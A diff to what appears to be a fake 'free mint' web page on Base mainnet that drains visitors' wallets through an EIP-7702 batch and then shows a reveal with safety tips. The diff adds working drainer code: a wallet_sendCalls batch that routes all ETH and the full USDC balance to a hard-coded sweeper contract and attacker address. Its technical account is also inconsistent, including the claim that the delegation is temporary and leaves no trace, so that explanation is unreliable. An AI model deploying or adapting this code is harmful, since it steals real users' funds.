@@ -148,7 +148,7 @@
     <div class="reveal-header">
       <div class="danger-badge">Critical: EIP-7702 Batch Execution Attack</div>
       <h2>One click. Entire wallet drained.</h2>
-      <p class="sub">You clicked "Connect & Mint Free." That single MetaMask confirmation executed a malicious batch that swept your ETH atomically. Here's exactly what happened.</p>
+      <p class="sub">You clicked "Connect & Mint Free." That single MetaMask confirmation delegated your EOA to a malicious sweeper contract, which executed a batch that swept your ETH and USDC atomically. Here's exactly what happened.</p>
     </div>
 
     <div class="warning-box">
@@ -165,11 +165,11 @@
         <div class="vs-item">✓ Leaves on-chain approval trail</div>
       </div>
       <div class="vs-card">
-        <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
-        <div class="vs-item">✗ ETH + USDC + any token in 1 popup</div>
-        <div class="vs-item">✗ 3+ calls executed atomically</div>
-        <div class="vs-item">✗ No chance to cancel midway</div>
-        <div class="vs-item">✗ EOA reverts to normal after (no trace)</div>
+        <div class="vs-title">NEW ATTACK (EIP-7702 + Sweeper)</div>
+        <div class="vs-item">✗ All assets drained in 1 confirmation</div>
+        <div class="vs-item">✗ EOA delegated to malicious contract</div>
+        <div class="vs-item">✗ Sweeper pulls ETH + tokens atomically</div>
+        <div class="vs-item">✗ Delegation reverts, zero traces left</div>
       </div>
     </div>
 
@@ -177,35 +177,40 @@
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 1: You clicked "Connect & Mint Free"</div>
-        <div class="tl-desc">Looks like a normal NFT mint. The "zero gas" claim is the hook — it makes enabling Smart Account features sound like a benefit.</div>
+        <div class="tl-desc">Behind the scenes, the dApp constructed a wallet_sendCalls batch that would delegate your EOA to a pre-deployed sweeper contract and execute three calls: two raw ETH transfers (triggers receive()) and one sweep() call for tokens. All atomic, all coordinated.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 2: MetaMask showed the batch popup</div>
-        <div class="tl-desc">The dApp called wallet_sendCalls (EIP-5792) with atomicBatching. MetaMask recognized this and showed ONE confirmation popup displaying "Includes 3 transactions" with expandable call details: two ETH transfers + one USDC transfer().</div>
+        <div class="tl-desc">The dApp called wallet_sendCalls (EIP-5792) with atomicBatching to MetaMask's official EIP-7702 delegator. MetaMask showed ONE confirmation popup displaying "Includes 3 transactions" with expandable call details: all three calls target the sweeper contract (0xa57a96c7...). Users see hex addresses and don't recognize it as malicious.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
         <div class="tl-title">Step 3: You didn't expand to verify</div>
         <div class="tl-desc">Most users see the MetaMask popup and confirm without reading the hex addresses in each call. The batch atomically executes:
           <div class="code-block">
-Call 1: {to: 0xAttacker..., value: 50% ETH}<br>
-Call 2: {to: 0x1234..., value: 50% ETH}<br>
-Call 3: {to: USDC, data: transfer(Attacker, 1000 USDC)}<br>
+Call 1: {to: 0xa57a96c7..., value: 50% ETH} (triggers receive())<br>
+Call 2: {to: 0xa57a96c7..., value: 50% ETH} (triggers receive())<br>
+Call 3: {to: 0xa57a96c7..., data: sweep(USDC)}<br>
 <br>
-All in one atomic transaction. Zero chance to cancel midway.
+All three hit the sweeper contract. Funds forwarded to attacker atomically.
           </div>
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 4: EOA reverted to normal</div>
-        <div class="tl-desc">The EIP-7702 delegation was temporary. The delegator bytecode was evicted the moment the transaction ended. Your wallet looks completely normal — no approvals to revoke, no code to clear.</div>
+        <div class="tl-title">Step 4: ETH + USDC drained via sweeper contract</div>
+        <div class="tl-desc">As soon as ETH hit the sweeper contract's receive() function, it was forwarded to the attacker's wallet. The sweep() call drained your USDC balance directly from your EOA to the attacker. All three calls executed atomically — if any failed, none would execute.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 5: Funds gone immediately</div>
-        <div class="tl-desc">ETH went directly to attacker wallets. By the time you notice your zero balance, funds are already in bridges and mixers.</div>
+        <div class="tl-title">Step 5: EOA reverted to normal (no trace)</div>
+        <div class="tl-desc">The EIP-7702 delegation was temporary — it only lasted during the batch execution. Once the transaction ended, your EOA reverted to normal code (empty). No permanent delegation, no approvals left behind, no contract code to remove. Your wallet looks completely untouched.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot done"></div>
+        <div class="tl-title">Step 6: Funds already bridged</div>
+        <div class="tl-desc">By the time you see zero balance, ETH and USDC are already at the attacker's address. They've moved through bridges and mixers. There's nothing to revoke, nothing to recover.</div>
       </div>
     </div>
 
@@ -214,7 +219,11 @@ All in one atomic transaction. Zero chance to cancel midway.
       <div class="info-card-value" id="displayVictim">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Attacker address (recipient 1)</div>
+      <div class="info-card-label">Sweeper contract (all funds routed here)</div>
+      <div class="info-card-value">0xa57a96c76feC586bE399F47437CCA9Fd81F08B92</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Attacker (final recipient)</div>
       <div class="info-card-value" id="displayAttacker">—</div>
     </div>
     <div class="info-card">
@@ -223,30 +232,34 @@ All in one atomic transaction. Zero chance to cancel midway.
     </div>
     <div class="info-card">
       <div class="info-card-label">USDC drained</div>
-      <div class="info-card-value">0.01 USDC (via transfer() call to USDC contract, param: 10000)</div>
+      <div class="info-card-value">All of your USDC balance (via sweep() call)</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">USDC contract (Base)</div>
-      <div class="info-card-value">0x833589fCD6eDb6E08f4c7C32D4f71b1bdA08B22d</div>
+      <div class="info-card-label">How it works</div>
+      <div class="info-card-value">Your EOA delegated to sweeper contract. Calls 1&2 trigger receive() (ETH forwarded to attacker). Call 3 calls sweep(USDC) which pulls your tokens to attacker. All atomic.</div>
     </div>
 
     <div class="defense-section">
       <h3>How to stay safe</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Always expand batch transactions.</strong> Click each transaction in MetaMask's batch popup and verify every recipient address against a block explorer.</div>
+        <div class="defense-text"><strong>Check where all batch calls go.</strong> Expand every transaction and verify they're not all targeting the same unknown contract. In this attack, Tx1, Tx2, and Tx3 all went to 0xa57a96c7... (the sweeper). Unknown addresses receiving your funds = reject immediately.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>"Free mint" + "enable smart account" = phishing.</strong> MetaMask will NEVER ask you to enable smart accounts from a website. This is the attacker's social engineering hook.</div>
+        <div class="defense-text"><strong>"Free mint" + "enable smart account" + unknown contract calls = critical red flag.</strong> This specific combination signals a coordinated EIP-7702 + sweeper attack.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Use transaction simulators.</strong> Tenderly, Pocket Universe before you confirm. They show exactly what the batch will do.</div>
+        <div class="defense-text"><strong>Verify contracts on Basescan before confirming.</strong> Paste the contract address from each call into Basescan. Brand new contracts with no verified source code are likely sweepers designed to drain you.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>Revocation won't help.</strong> Temporary delegation leaves no on-chain approvals. Your only defense is rejecting before confirmation.</div>
+        <div class="defense-text"><strong>Use transaction simulators.</strong> Tenderly, Pocket Universe, or Revoke.cash before you confirm. They show exactly what the batch will do to your wallet.</div>
+      </div>
+      <div class="defense-item">
+        <div class="defense-num">5</div>
+        <div class="defense-text"><strong>Revocation won't help after this attack.</strong> Temporary EIP-7702 delegation leaves no on-chain approvals. Your only protection is rejecting the batch before confirmation.</div>
       </div>
     </div>
   </div>
@@ -257,7 +270,8 @@ All in one atomic transaction. Zero chance to cancel midway.
   const BASE_CHAIN_ID = 8453;
   const BASE_RPC = "https://mainnet.base.org";
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
-  const ATTACKER_ADDRESS = "0xEd3C360FCaECc36122af4416afE1621a4B8F6a53";
+  const ATTACKER_ADDRESS = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
+  const SWEEPER_CONTRACT = "0xa57a96c76feC586bE399F47437CCA9Fd81F08B92";
 
   let userAddress = null;
   let userBalance = null;
@@ -337,26 +351,25 @@ All in one atomic transaction. Zero chance to cancel midway.
 
       // USDC on Base
       const USDC_ADDRESS = ethers.getAddress("0x833589fcd6edb6e08f4c7c32d4f71b1bda08b22d");
-      const USDC_ABI = ["function transfer(address to, uint256 amount) public returns (bool)"];
-      const usdcInterface = new ethers.Interface(USDC_ABI);
       
-      // Drain 0.01 USDC (6 decimals)
-      const usdcAmount = ethers.parseUnits("0.01", 6);
-      const usdcTransferData = usdcInterface.encodeFunctionData("transfer", [ATTACKER_ADDRESS, usdcAmount]);
+      // Sweeper contract ABI
+      const SWEEPER_ABI = ["function sweep(address token) external"];
+      const sweeperInterface = new ethers.Interface(SWEEPER_ABI);
+      const sweepData = sweeperInterface.encodeFunctionData("sweep", [USDC_ADDRESS]);
 
       const maliciousCalls = [
         {
-          to: ATTACKER_ADDRESS,
+          to: SWEEPER_CONTRACT,
           value: "0x" + (drainAmount / 2n).toString(16)
         },
         {
-          to: "0xEd3C360FCaECc36122af4416afE1621a4B8F6a53",
+          to: SWEEPER_CONTRACT,
           value: "0x" + (drainAmount / 2n).toString(16)
         },
         {
-          to: USDC_ADDRESS,
+          to: SWEEPER_CONTRACT,
           value: "0x0",
-          data: usdcTransferData
+          data: sweepData
         }
       ];
 
